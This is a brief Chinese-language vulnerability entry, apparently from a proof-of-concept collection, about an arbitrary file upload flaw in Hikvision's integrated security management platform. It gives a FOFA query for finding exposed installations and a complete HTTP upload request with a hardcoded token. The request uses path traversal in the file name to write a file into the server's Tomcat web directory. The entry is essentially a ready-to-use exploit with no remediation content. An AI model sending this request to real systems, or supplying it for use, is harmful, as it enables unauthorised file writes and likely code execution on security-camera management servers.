# 海康威视综合安防管理平台uploadAllPackage任意文件上传漏洞



## fofa

```yaml
app="HIKVISION-综合安防管理平台"
```

## poc

```yaml
POST /center_install/picUploadService/v1/uploadAllPackage/image HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: */*
Host: 192.168.52.228:8001
Accept-Encoding: gzip, deflate
Connection: close
Token: SElLIGlhL3NmaGNjaTY3WWxWK0Y6UzVCcjg1a2N1dENqVUNIOUM3SE1GamNkN2dnTE1BN1dGTDJldFE0UXFvbz0=
Content-Type: multipart/form-data; boundary=--------------------------553898708333958420021355
Content-Length: 233

----------------------------553898708333958420021355
Content-Disposition: form-data; name="sendfile"; filename="../../../../components/tomcat85linux64.1/webapps/eportal/y4.js"
Content-Type: application/octet-stream

expzhizhuo
----------------------------553898708333958420021355--
```

![image-20240803161009171](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408031610248.png)

![image-20240803161031683](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408031610764.png)

## 漏洞来源

- https://mp.weixin.qq.com/s/hYEg8jKyBHNV-wFGcuvGbw